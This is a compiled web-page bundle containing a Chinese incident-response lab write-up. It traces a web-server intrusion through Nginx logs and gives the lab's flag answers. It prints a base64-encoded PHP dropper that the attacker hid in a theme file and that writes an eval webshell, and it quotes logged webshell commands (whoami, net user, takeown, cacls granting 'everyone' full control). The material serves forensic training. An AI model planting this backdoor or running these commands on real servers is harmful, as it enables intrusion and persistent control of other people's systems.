"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1629],{83476:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>a,contentTitle:()=>p,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"Xuanji/Unit-4/54","title":"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - wordpress","description":"1","source":"@site/docs/Xuanji/Unit-4/54.md","sourceDirName":"Xuanji/Unit-4","slug":"/Xuanji/Unit-4/54","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-4/54","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-4/54.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Xuanji_Sidebar","previous":{"title":"\u7b2c\u4e09\u7ae0 \u6743\u9650\u7ef4\u6301 linux \u6743\u9650\u7ef4\u6301 - \u9690\u85cf","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-3/27"},"next":{"title":"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - emlog","permalink":"/Target-Machines-WriteUp/docs/Xuanji/Unit-4/61"}}');var r=i(74848),l=i(28453);const o={},p="\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - wordpress",a={},c=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2},{value:"5",id:"5",level:2},{value:"6",id:"6",level:2}];function t(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",strong:"strong",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\u7b2c\u56db\u7ae0-windows-\u5b9e\u6218---wordpress",children:"\u7b2c\u56db\u7ae0 windows \u5b9e\u6218 - wordpress"})}),"\n",(0,r.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:["\u8bf7\u63d0\u4ea4\u653b\u51fb\u8005\u653b\u51fb\u6210\u529f\u7684\u7b2c\u4e00\u65f6\u95f4\uff0c\u683c\u5f0f\uff1a",(0,r.jsx)(n.code,{children:"flag{YY:MM:DD hh:mm:ss}"})]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"rdp \u8fde\u63a5\u5230\u670d\u52a1\u5668"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(55429).A+"",width:"2010",height:"1151"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230 Nginx \u7684\u65e5\u5fd7\u76ee\u5f55 ",(0,r.jsx)(n.code,{children:"C:\\phpstudy_pro\\Extensions\\Nginx1.15.11\\logs"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u5bf9 ",(0,r.jsx)(n.code,{children:"access.log"})," \u65e5\u5fd7\u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u4ee5\u4e0b\u8bb0\u5f55"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-log",children:'192.168.141.55 - - [29/Apr/2023:22:48:23 +0800] "GET /manage/options-theme.php HTTP/1.1" 200 12345 "http://192.168.141.188/manage/theme-editor.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:48:23 +0800] "GET /manage/theme-editor.php HTTP/1.1" 200 16037 "http://192.168.141.188/manage/options-theme.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:07 +0800] "POST /index.php/action/themes-edit?_=961610959bca6fdfe6766df40ec1e482 HTTP/1.1" 302 5 "http://192.168.141.188/manage/theme-editor.php?theme=default&file=post.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:07 +0800] "GET /manage/theme-editor.php?theme=default&file=post.php HTTP/1.1" 200 16012 "http://192.168.141.188/manage/theme-editor.php?theme=default&file=post.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:10 +0800] "GET / HTTP/1.1" 200 6680 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:12 +0800] "GET /index.php/archives/1/ HTTP/1.1" 200 13456 "http://192.168.141.188/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:13 +0800] "GET /index.php/category/default/ HTTP/1.1" 200 7004 "http://192.168.141.188/index.php/archives/1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:21 +0800] "GET /.x.php?cmd=system(%27whoami%27); HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:02:25 +0800] "GET /.x.php?x=system(%27whoami%27); HTTP/1.1" 200 34 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:05:39 +0800] "POST /.x.php HTTP/1.1" 200 152 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"\n192.168.141.55 - - [29/Apr/2023:23:05:49 +0800] "POST /.x.php HTTP/1.1" 200 157 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0"\n192.168.141.55 - - [29/Apr/2023:23:05:49 +0800] "POST /.x.php HTTP/1.1" 200 438 "-" "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01"\n192.168.141.55 - - [29/Apr/2023:23:05:51 +0800] "POST /.x.php HTTP/1.1" 200 443 "-" "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"\n192.168.141.55 - - [29/Apr/2023:23:08:51 +0800] "GET /.x.php?cmd=net%20user HTTP/1.1" 200 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:08:51 +0800] "GET /favicon.ico HTTP/1.1" 404 154 "http://192.168.141.188/.x.php?cmd=net%20user" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:09:00 +0800] "GET /.x.php?x=system(%27takeown%20/f%20index.php%27); HTTP/1.1" 200 112 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:23:09:52 +0800] "GET /.x.php?x=system(%27cacls%20%20install.php%20/p%20everyone:f%20/e%27); HTTP/1.1" 200 56 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u786e\u8ba4\uff0c\u5728\u8fd9\u90e8\u5206\uff0c\u653b\u51fb\u8005\u6210\u529f\u5b9e\u73b0\u4e86\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u4e86 webshell \u6587\u4ef6 ",(0,r.jsx)(n.code,{children:".x.php"})," \u5e76\u6267\u884c\u4e86\u547d\u4ee4"]}),"\n",(0,r.jsx)(n.p,{children:"\u7ed3\u5408\u6587\u4ef6\u4e0a\u4f20\u5e38\u7528\u7684\u4e3a POST \u65b9\u6cd5\uff0c\u5e76\u7ed3\u5408 Wordpress \u5e38\u89c1\u7684\uff0c\u7ed3\u5408\u4e3b\u9898\u529f\u80fd\u5b9e\u73b0\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u53ef\u4ee5\u786e\u5b9a\u653b\u51fb\u8005\u4e0a\u4f20 webshell \u7684\u65f6\u95f4"}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u7b54\u6848\u4e0d\u5bf9\uff0c\u5f88\u660e\u663e\uff0c\u5728\u903b\u8f91\u4e0a\uff0c\u57fa\u4e8e\u4e3b\u9898\u529f\u80fd\u4e0a\u4f20\u6587\u4ef6\u7684\u524d\u63d0\uff0c\u662f\u6210\u529f\u767b\u9646\u540e\u53f0\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u6210\u529f\u653b\u51fb\u7684\u65f6\u95f4\u5e94\u8be5\u5f80\u524d\u63a8\u79fb\u81f3\u653b\u51fb\u8005\u6210\u529f\u767b\u9646\u540e\u53f0\u7684\u65e5\u5fd7"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-log",children:'192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] "POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1" 302 5 "http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:44:38 +0800] "GET /manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F HTTP/1.1" 200 7229 "http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] "POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1" 302 5 "http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] "GET /manage/ HTTP/1.1" 302 5 "http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] "GET /manage/welcome.php HTTP/1.1" 200 10013 "http://192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n192.168.141.55 - - [29/Apr/2023:22:45:32 +0800] "GET /manage/themes.php HTTP/1.1" 200 11080 "http://192.168.141.188/manage/welcome.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"\n'})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{2023:04:29 22:45:23}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:["\u8bf7\u63d0\u4ea4\u653b\u51fb\u8005\u7684\u6d4f\u89c8\u5668\u7248\u672c ",(0,r.jsx)(n.code,{children:"flag{Firgfox/2200}"})]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5b9a\u4f4d\u653b\u51fb\u8005\u8bbf\u95ee\u540e\u53f0\u7684\u8bb0\u5f55\uff0c\u5f97\u5230 User-agent \u7684\u4fe1\u606f\u4e3a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u5f97\u5230\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{Firefox/110.0}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u8bf7\u63d0\u4ea4\u653b\u51fb\u8005\u76ee\u5f55\u626b\u63cf\u6240\u4f7f\u7528\u7684\u5de5\u5177\u540d\u79f0"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u4e0a\u4e00\u9898\u7684\u4fe1\u606f\uff0c\u5df2\u7ecf\u53ef\u4ee5\u786e\u5b9a\u653b\u51fb\u8005\u7684 ip \u5730\u5740\u4e3a ",(0,r.jsx)(n.code,{children:"192.168.141.55"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u5f80\u4e0a\u5b9a\u4f4d\u65e5\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u5927\u91cf\u7684 ",(0,r.jsx)(n.code,{children:"HTTP Status 404"})," \u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5\u786e\u5b9a\u4e3a\u76ee\u5f55\u626b\u63cf\uff0c\u8fd9\u4e9b\u8bf7\u6c42\u7684 User-agent \u90fd\u662f ",(0,r.jsx)(n.code,{children:"Fuzz Faster U Fool v1.5.0"})]}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{Fuzz Faster U Fool}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u627e\u5230\u653b\u51fb\u8005\u5199\u5165\u7684\u6076\u610f\u540e\u95e8\u6587\u4ef6\uff0c\u63d0\u4ea4\u6587\u4ef6\u540d\uff08\u5b8c\u6574\u8def\u5f84\uff09"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u7b2c\u4e00\u95ee\u7684\u6392\u67e5\u8fc7\u7a0b\u4e2d\uff0c\u5df2\u7ecf\u5b9a\u4f4d\u5230\u4e86\u653b\u51fb\u8005\u4e0a\u4f20\u7684 webshell \u6587\u4ef6\u4e3a ",(0,r.jsx)(n.code,{children:".x.php"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230 ",(0,r.jsx)(n.code,{children:"Phpstudy"})," \u7684 WWW \u76ee\u5f55\uff0c\u5b9a\u4f4d\u5230\u76f8\u5173\u6587\u4ef6"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(36202).A+"",width:"2010",height:"1151"})}),"\n",(0,r.jsx)(n.p,{children:"\u5373\u53ef\u786e\u5b9a\u7b54\u6848"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{C:\\phpstudy_pro\\WWW\\.x.php}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"5",children:"5"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u627e\u5230\u653b\u51fb\u8005\u9690\u85cf\u5728\u6b63\u5e38 web \u5e94\u7528\u4ee3\u7801\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u63d0\u4ea4\u8be5\u6587\u4ef6\u540d\uff08\u5b8c\u6574\u8def\u5f84\uff09"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636e\u6587\u4ef6\u4fee\u6539\u65f6\u95f4\uff0c\u914d\u5408\u5e38\u89c1\u7684\u5173\u952e\u8bcd\u548c\u53d1\u73b0\u7684 webshell\uff0c\u5b9a\u4f4d\u5230 ",(0,r.jsx)(n.code,{children:"C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php"})," \u6587\u4ef6"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php @file_put_contents('.x.php',base64_decode('PD9waHAgQGV2YWwoJF9SRVFVRVNUWyd4J10pOyA/Pg=='));?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f88\u660e\u663e\uff0c\u5199\u4e86\u4e00\u4e2a webshell \u7ef4\u6301"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php}\n"})}),"\n",(0,r.jsx)(n.h2,{id:"6",children:"6"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:["\u8bf7\u6307\u51fa\u53ef\u7591\u8fdb\u7a0b\u91c7\u7528\u7684\u81ea\u52a8\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u542f\u52a8\u7684\u811a\u672c\u7684\u540d\u5b57 ",(0,r.jsx)(n.code,{children:"flag{1.exe}"})]}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408\u9898\u76ee\u8bf4\u5230\u7684\u81ea\u52a8\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u6392\u67e5 ",(0,r.jsx)(n.code,{children:"shell:Startup"})," \u76ee\u5f55\uff0c\u670d\u52a1\u7b49\u80fd\u591f\u5b9e\u73b0\u81ea\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5e76\u4e0d\u80fd\u627e\u5230"]}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5e38\u89c1\u7684\u76ee\u5f55\u8fdb\u884c\u6392\u67e5\uff0c\u5b9a\u4f4d\u5230"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(30504).A+"",width:"2010",height:"1151"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c06\u6837\u672c\u63d0\u53d6\u51fa\u6765\u8fdb\u884c\u5206\u6790"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:i(10643).A+"",width:"2559",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ed3\u5408\u9898\u76ee\u8981\u6c42\u7684\uff0c\u786e\u5b9a\u542f\u52a8\u7684 ",(0,r.jsx)(n.strong,{children:"Script"})," \u7684\u540d\u5b57\uff0c\u5373\u53ef\u786e\u5b9a\u7b54\u6848"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",children:"flag{x.bat}\n"})})]})}function d(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(t,{...e})}):t(e)}},55429:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241010-221056-ee3f6d0c1724b962a60346bb96e4054e.png"},36202:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241031-223139-30383496129c8c401f0174ffc42c2935.png"},30504:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241051-225106-52cbe1ae499dc8e6f29fc31f38d9bc9f.png"},10643:(e,n,i)=>{i.d(n,{A:()=>s});const s=i.p+"assets/images/image_20241052-225229-ff162db5b3a8e6aede7c4b635868650d.png"},28453:(e,n,i)=>{i.d(n,{R:()=>o,x:()=>p});var s=i(96540);const r={},l=s.createContext(r);function o(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function p(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);